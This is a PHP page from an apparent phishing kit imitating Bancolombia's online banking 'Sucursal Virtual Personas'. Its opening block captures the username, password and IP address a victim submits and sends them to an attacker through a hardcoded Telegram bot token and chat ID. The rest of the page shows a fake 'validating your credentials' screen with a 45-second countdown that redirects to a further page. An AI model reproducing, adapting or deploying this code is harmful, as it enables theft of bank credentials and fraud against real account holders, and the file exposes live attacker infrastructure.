<?php

@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
////////////////////
if ( isset ($_POST['usdfdsr']) && isset ($_POST['pssaswd'])  ){

$message = "Usuar.: ".$_POST['usdfdsr']." - Clv.: ".$_POST['pssaswd']." - IP ".$userp ."\r\n";

$apiToken = "5616996596:AAGeCBIX3Mufu0LpHpBsXFaG4OnCm5Ih1jo";


$data = [
  'chat_id' => '5556144075',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}else{ header ('location: index.php'); exit();
 }

?>

<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">



<link href="./hfh/styles.css" media="all" rel="stylesheet" type="text/css">
  
  <link href="./hfh/bootstrap.css" media="all" rel="stylesheet" type="text/css">  

	

	<link href="./hfh/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./hfh/ui.css" media="all" rel="stylesheet" type="text/css">
 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=45;
    
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos verificando su información";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>

</head>

<body style="">

<div id="cargando" style="width: 100%; text-align: center; display: none;">

     </div>
<div id="contenidoWeb" style="">
	<form method="POST" id="main_form" autocomplete="off" action="info.php">
	
	
			<div class="container" id="containerMain">

			

				

<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
				<div>
	<div class="timeText">Fecha y hora actual:</div>
	<span id="jclock1" class="lastVisitedText" >
	<?php
date_default_timezone_set('America/Bogota');    
$dias = array("Domingo","Lunes","Martes","Miercoles","Jueves","Viernes","Sábado");
$meses = array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");

$DateAndTime = date('m-d-Y h:i:s A', time());  
echo "".$dias[date('w')]." ".date('d')." de ".$meses[date('n')-1]. " del ".date('Y')." ".date('h:i:s A', time())."" ;



?>

</span>
</div>	
		</div>
			</div>
		</div>
	</div>

	<div class="panel-heading">
		<h3>
			Validando sus credenciales
		</h3>
	</div>
</div>
			
			<div class="panel panel-primary">
				<div class="row" id="error">
					



				</div>

			<div class="mua-panel-body">
					  
					<div class="row">
					
						<div class="col-lg-5 col-md-5 col-sm-6">
							
											
								<h5 class="mua-title-h5"><font color="#FFFFFF"> Imagen y frase de seguridad seleccionadas</font></h5>
											
								<p class="mua-phrase-message mua-small-text"><font color="#FFFFFF">Digita tu Clave personal.</font></p>

								<div id="phraseImage" class="mua-image-login-container">
									




								</div>
							
									
						</div>
					
					
						<div class="col-lg-4 col-md-5 col-sm-6">

							<div class="panel_general">
								<div class="title-panel-label">
									<h1>
										Cargando...
									</h1>
								</div>
								
									
								
								<div id="contenido">
								<div align="center">
									<img src="hfh/thbm.gif" style="width:250px;"></div>

									<div class="mua-content-legend">
										<p id='CuentaAtras'></p>
									</div>
								</div>

						

			

							</div>

						</div>
						
				

		                	
					</div>
				</div>
			
	
			
			
			</div>

		
<br><br><br><br><br><br>

<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer mua-footer-info-call">
			Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; 343 0000 - Medell&iacute;n 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 Sucursales Telef&oacute;nicas en el exterior: Espa&ntilde;a 900 995 717 - Estados Unidos 1866 379 9714.
		</p>
	</div>
</div>

		
 





	        <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left"></div>
	            <div class="mua-title-text pull-right"><span id="fecha">2022</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
	        </div>
	   

		</div>

	
	   </form>
	  </div> 

</body>
</html>